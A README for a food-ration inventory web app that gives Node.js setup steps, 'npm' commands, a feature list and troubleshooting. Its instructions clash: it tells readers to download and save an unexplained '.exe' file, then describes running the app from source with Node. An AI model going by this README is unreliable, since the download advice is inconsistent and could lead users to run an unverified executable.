# 📦 project-namma-ration - Modern system for managing food supplies

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/leiaconstitutional3044/project-namma-ration)

Project Namma Ration simplifies how users track and manage food allocations. This tool provides a clear view of inventory levels and distribution history. It removes the need for manual record keeping by automating data entry and tracking.

## ⚙️ System Requirements

Ensure your computer meets these standards before you begin.

* Operating System: Windows 10 or Windows 11.
* Memory: 4 GB of RAM minimum.
* Storage: 200 MB of free space.
* Internet Connection: Stable connection for initial setup.

## 📥 Getting the Application

Visit this page to download the software: [https://github.com/leiaconstitutional3044/project-namma-ration](https://github.com/leiaconstitutional3044/project-namma-ration)

Select the file that best fits your Windows version. Most users should choose the file ending in .exe. Save this file to your Downloads folder or another location you can find easily.

## 🛠 Setting Up Your Environment

This application requires Node.js to function. Follow these steps to prepare your computer.

1. Open a web browser and navigate to the official Node.js website.
2. Download the version labeled as LTS.
3. Open the downloaded installer file.
4. Follow the prompts on the screen to install the software. Accept the default settings to ensure compatibility.
5. Restart your computer after the installation finishes.

## 🚀 Running the Application

Follow these steps to start the software after you download the project code.

1. Locate the folder where you saved the project files. 
2. If the files arrive as a compressed zip folder, right-click the folder and choose Extract All.
3. Open the main project folder.
4. Click the address bar at the top of the file explorer window. 
5. Type `cmd` and press the Enter key. A black window will appear.
6. Type `npm i` and press Enter. Wait for the computer to finish installing necessary files. This process takes a few minutes depending on your internet speed.
7. Type `npm run dev` and press Enter.
8. The server will start. Keep this black window open while you use the application.
9. Open your web browser and go to the address shown in the black window. This is usually `http://localhost:3000`.

## 📋 Features

This application includes tools to manage ration distribution across multiple locations. You can view current stock levels and update records as items arrive or leave. The interface highlights discrepancies to help you maintain accurate counts. 

* Inventory Tracking: Monitor stock levels in real-time.
* Historical Reports: View past distribution records for any specific date range.
* User Permissions: Manage access to prevent unauthorized changes to records.
* Data Export: Save your reports as files for printing or sharing.

## 💡 Using the Interface

The dashboard provides a snapshot of your current inventory. Use the side menu to navigate between different sections. 

Click on the Inventory tab to view the current list of items. To update an item, click the Edit button next to the name. Enter the new quantity in the box and click Save. The system updates the records instantly.

Visit the Reports tab to generate a breakdown of daily, weekly, or monthly usage. Select the date range and click Generate. The system compiles the data and shows a chart of your usage patterns.

## 🛠 Troubleshooting Common Issues

Check these items if the application does not start as expected.

* If the command prompt shows an error regarding `npm`, verify that Node.js installed correctly. 
* Close any other programs that might use your internet ports. 
* Ensure you are inside the main folder before you type the commands. 
* If the page stays blank in your browser, refresh the page after 30 seconds to allow the server time to load.
